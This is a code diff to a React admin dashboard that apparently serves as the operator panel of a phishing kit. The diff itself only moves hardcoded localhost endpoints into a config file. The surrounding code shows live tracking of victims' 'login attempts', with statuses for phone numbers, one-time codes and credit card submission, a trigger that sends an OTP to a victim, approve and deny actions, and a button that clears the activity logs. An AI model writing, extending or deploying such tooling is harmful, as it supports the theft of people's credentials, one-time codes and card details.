@@ -2,6 +2,7 @@ import React, { useState, useEffect, useCallback } from 'react';
 import io from 'socket.io-client';
 import { AlertCircle, CheckCircle2, XCircle, RefreshCw, ShieldAlert, Trash2 } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
+import { API_BASE_URL, WS_URL } from '../config';
 
 // More flexible status type
 type AttemptStatus = 'pending' | 'approved' | 'denied' | 'phone_required' | 'phone_submitted' | 'otp_sent_to_user' | 'otp_submitted' | 'cc_required' | 'pending_cc_verification' | 'otp_verified' | 'cc_submitted' | 'failed';
@@ -80,7 +81,7 @@ export default function AdminDashboard() {
   const fetchLoginAttempts = useCallback(async () => {
     setIsLoading(true);
     try {
-      const response = await fetch('http://localhost:5000/api/login-attempts', { credentials: 'include' });
+      const response = await fetch(`${API_BASE_URL}/api/login-attempts`, { credentials: 'include' });
       if (!response.ok) {
         if (response.status === 403) navigate('/login');
         throw new Error('Failed to fetch login attempts');
@@ -101,12 +102,12 @@ export default function AdminDashboard() {
         if (lastTwoDigits && lastTwoDigits.match(/^\d{2}$/)) {
             try {
                 // Call the new, simplified endpoint
-                await fetch(`http://localhost:5000/api/send-otp/${attemptId}`, {
-                    method: 'POST',
+                await fetch(`${API_BASE_URL}/api/send-otp/${attemptId}`, {
+        method: 'POST',
                     headers: { 'Content-Type': 'application/json', },
                     body: JSON.stringify({ last_two_digits: lastTwoDigits }),
-                    credentials: 'include',
-                });
+        credentials: 'include',
+      });
             } catch (err) {
                 // Handle error silently
             }
@@ -124,7 +125,7 @@ export default function AdminDashboard() {
     const endpoint = endpointMap[action];
     if (!endpoint) return;
     try {
-      await fetch(`http://localhost:5000/api/${endpoint}`, { method: 'POST', credentials: 'include' });
+      await fetch(`${API_BASE_URL}/api/${endpoint}`, { method: 'POST', credentials: 'include' });
       } catch (err) {
       // Silently fail, admin will see the UI not update
     }
@@ -133,7 +134,7 @@ export default function AdminDashboard() {
   const handleClearLogs = async () => {
     if (window.confirm('Are you sure you want to delete all activity logs?')) {
         try {
-            await fetch('http://localhost:5000/api/clear-logs', { method: 'POST', credentials: 'include' });
+            await fetch(`${API_BASE_URL}/api/clear-logs`, { method: 'POST', credentials: 'include' });
         } catch (err) {
             // Silently fail
         }
@@ -143,7 +144,7 @@ export default function AdminDashboard() {
   useEffect(() => {
     fetchLoginAttempts();
     const notificationAudio = new Audio('/notification.mp3');
-    const socket: any = io('http://localhost:5000/admin', { withCredentials: true, } as any);
+    const socket: any = io(`${WS_URL}/admin`, { withCredentials: true, } as any);
 
     socket.on('new_login_attempt', (newAttempt: LoginAttempt) => {
         setLoginAttempts(prev => [newAttempt, ...prev.filter(a => a.id !== newAttempt.id)]);
